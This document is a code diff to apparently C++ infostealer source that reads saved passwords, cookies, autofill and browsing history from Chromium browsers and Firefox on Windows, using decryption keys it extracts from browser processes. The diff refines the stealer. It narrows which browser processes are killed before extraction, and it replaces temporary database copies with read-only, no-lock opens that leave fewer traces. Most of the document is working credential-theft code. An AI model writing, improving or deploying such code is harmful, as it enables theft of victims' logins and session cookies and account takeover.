@@ -170,24 +170,11 @@ int main() {
         }
     };
 
-    kill_processes_by_name("browser.exe");
-    kill_processes_by_name("chrome.exe");
-    kill_processes_by_name("msedge.exe");
-    kill_processes_by_name("brave.exe");
-    kill_processes_by_name("opera.exe");
-    kill_processes_by_name("launcher.exe");
-    kill_processes_by_name("firefox.exe");
-    kill_processes_by_name("waterfox.exe");
-    kill_processes_by_name("librewolf.exe");
-    kill_processes_by_name("thunderbird.exe");
-    kill_processes_by_name("discord.exe");
-    kill_processes_by_name("Discord.exe");
-    kill_processes_by_name("DiscordCanary.exe");
-    kill_processes_by_name("DiscordPTB.exe");
-    kill_processes_by_name("Lightcord.exe");
-    kill_processes_by_name("Telegram.exe");
-
     for (const auto& config : configs) {
+        if (config.has_abe && !config.process_name.empty()) {
+            kill_processes_by_name(config.process_name);
+        }
+
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
 
         // Outlook fallback check
@@ -792,6 +779,12 @@ bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& conf
 
 #include "includes/sqlite3.h"
 
+int open_db_readonly(const fs::path& db_path, sqlite3** db) {
+    std::string path_utf8 = to_narrow_string(db_path.wstring().c_str());
+    std::string uri = "file:" + path_utf8 + "?mode=ro&nolock=1";
+    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL);
+}
+
 void extract_passwords(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
     fs::path db_path = profile_path / "Login Data";
     if (!fs::exists(db_path)) {
@@ -799,11 +792,8 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
     }
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -824,7 +814,6 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
@@ -832,11 +821,8 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
     if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -860,7 +846,6 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
@@ -872,11 +857,8 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
         fs::path db_path = profile_path / db_name;
         if (!fs::exists(db_path)) continue;
 
-        fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-        fs::copy(db_path, temp_db);
-
         sqlite3* db;
-        if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+        if (open_db_readonly(db_path, &db) == SQLITE_OK) {
             sqlite3_stmt* stmt;
 
             if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
@@ -915,7 +897,6 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
             }
             sqlite3_close(db);
         }
-        fs::remove(temp_db);
     }
 }
 
@@ -923,11 +904,8 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
     fs::path db_path = profile_path / "History";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -942,7 +920,6 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
@@ -995,11 +972,8 @@ void extract_firefox_cookies(const fs::path& profile_path, const fs::path& outpu
     fs::path db_path = profile_path / "cookies.sqlite";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_cookies_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT host, name, value, path FROM moz_cookies";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -1015,18 +989,14 @@ void extract_firefox_cookies(const fs::path& profile_path, const fs::path& outpu
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_firefox_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "places.sqlite";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_history_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -1041,18 +1011,14 @@ void extract_firefox_history(const fs::path& profile_path, const fs::path& outpu
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_firefox_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "formhistory.sqlite";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_autofill_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT fieldname, value FROM moz_formhistory";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -1066,7 +1032,6 @@ void extract_firefox_autofill(const fs::path& profile_path, const fs::path& outp
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir);
